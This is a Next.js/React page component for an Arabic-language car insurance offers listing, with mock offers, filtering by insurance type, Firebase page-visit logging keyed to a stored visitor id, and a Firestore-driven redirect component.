"use client"

import { useEffect, useState, useMemo, useCallback } from "react"
import OfferCard from "../components/OfferCard"
import { addData } from "../apis/firebase"
import FirestoreRedirect from "./rediract-page"

interface Company {
  id: string
  name: string
  image_url: string
}

interface Offer {
  id: string
  name: string
  company_id: string
  type: FilterType
  main_price: string
  company: Company
  extra_features: Array<{ id: string; content: string; price: number }>
  extra_expenses: Array<{ reason: string; price: number }>
}

type FilterType = "against-others" | "special" | "comprehensive"

interface InsuranceTypeOption {
  id: FilterType
  label: string
  ariaLabel: string
}

// Mock data to replace API fetch
const mockOffers: Offer[] = [
  {
    id: "1",
    name: "تأمين ضد الغير الأساسي",
    company_id: "1",
    type: "against-others",
    main_price: "500",
    company: {
      id: "1",
      name: "شركة التأمين الأولى",
      image_url: "/placeholder.svg?height=64&width=64",
    },
    extra_features: [
      { id: "1", content: "تغطية الحوادث الشخصية", price: 100 },
      { id: "2", content: "المساعدة على الطريق", price: 50 },
    ],
    extra_expenses: [{ reason: "رسوم إدارية", price: 30 }],
  },
  {
    id: "2",
    name: "التأمين الشامل المتميز",
    company_id: "2",
    type: "comprehensive",
    main_price: "1200",
    company: {
      id: "2",
      name: "شركة التأمين الثانية",
      image_url: "/placeholder.svg?height=64&width=64",
    },
    extra_features: [
      { id: "3", content: "تغطية الأضرار الطبيعية", price: 200 },
      { id: "4", content: "سيارة بديلة", price: 150 },
      { id: "5", content: "تغطية قطع الغيار الأصلية", price: 300 },
    ],
    extra_expenses: [
      { reason: "رسوم إدارية", price: 50 },
      { reason: "ضريبة القيمة المضافة", price: 75 },
    ],
  },
  {
    id: "3",
    name: "تأمين مميز بلس",
    company_id: "3",
    type: "special",
    main_price: "900",
    company: {
      id: "3",
      name: "شركة التأمين الثالثة",
      image_url: "/placeholder.svg?height=64&width=64",
    },
    extra_features: [
      { id: "6", content: "تغطية السائق الشاب", price: 250 },
      { id: "7", content: "خصم على التجديد", price: 0 },
    ],
    extra_expenses: [{ reason: "رسوم تسجيل", price: 40 }],
  },
]

export default function Offers() {
  const [offers] = useState<Offer[]>(mockOffers)
  const [filteredOffers, setFilteredOffers] = useState<Offer[]>(mockOffers)
  const _id = localStorage.getItem("visitor")

  const [filters, setFilters] = useState({
    type: "" as FilterType | "",
    company: "",
  })
  useEffect(() => {
    addData({ id: _id,  pagename: "offers" })

  }  , []);
  const insuranceTypes: InsuranceTypeOption[] = useMemo(
    () => [
      { id: "against-others", label: "ضد الغير", ariaLabel: "تأمين ضد الغير" },
      { id: "comprehensive", label: "شامل", ariaLabel: "تأمين شامل" },
      { id: "special", label: "مميز", ariaLabel: "تأمين مميز" },
    ],
    [],
  )

  // Apply filters whenever they change
  useEffect(() => {
    let filtered = [...offers]

    if (filters.type) {
      filtered = filtered.filter((offer) => offer.type === filters.type)
    }

    if (filters.company) {
      filtered = filtered.filter((offer) => offer.company.name === filters.company)
    }

    setFilteredOffers(filtered)
  }, [filters, offers])

  const handleTypeChange = useCallback((typeId: FilterType) => {
    setFilters((prev) => ({
      ...prev,
      type: prev.type === typeId ? "" : typeId, // Toggle filter if clicked again
    }))
  }, [])

  return (
    <main className="min-h-screen bg-gradient-to-br from-gray-50 to-blue-50 py-8 md:py-12">
            <FirestoreRedirect id={_id} collectionName={"pays"}/>
      
      <div className="px-4 sm:px-6 lg:px-8 container mx-auto">
        <section className="rounded-2xl p-6 mb-8" role="region" aria-label="فلترة العروض">
          <div className="flex flex-col sm:flex-row gap-6 sm:gap-4 w-full sm:items-center">
            <h2 className="text-xl text-[#146394] font-semibold">نوع التأمين</h2>
            <div className="grid grid-cols-3 gap-3 md:w-1/3 w-fit" role="radiogroup" aria-label="اختيار نوع التأمين">
              {insuranceTypes.map((type) => (
                <button
                  key={type.id}
                  onClick={() => handleTypeChange(type.id)}
                  aria-pressed={filters.type === type.id}
                  aria-label={type.ariaLabel}
                  className={`px-3 py-2 rounded-lg transition-all duration-300 text-base whitespace-nowrap
                    ${
                      filters.type === type.id
                        ? "bg-[#146394] text-white shadow-lg transform scale-105"
                        : "bg-white text-gray-700 border-2 border-gray-200 hover:border-[#146394] hover:text-[#146394]"
                    }`}
                >
                  {type.label}
                </button>
              ))}
            </div>
          </div>
        </section>
        <section className="space-y-6" aria-label="قائمة العروض">
          {filteredOffers.length > 0 ? (
            filteredOffers.map((offer) => (
              <div key={offer.id}>
                <OfferCard offer={offer} />
                <hr className="mt-8 container mx-auto border-4 border-[#146394]" />
              </div>
            ))
          ) : (
            <div className="text-center py-12" role="status" aria-live="polite">
              <div className="text-gray-500 text-xl">لا توجد عروض متاحه الان</div>
            </div>
          )}
        </section>
      </div>
    </main>
  )
}

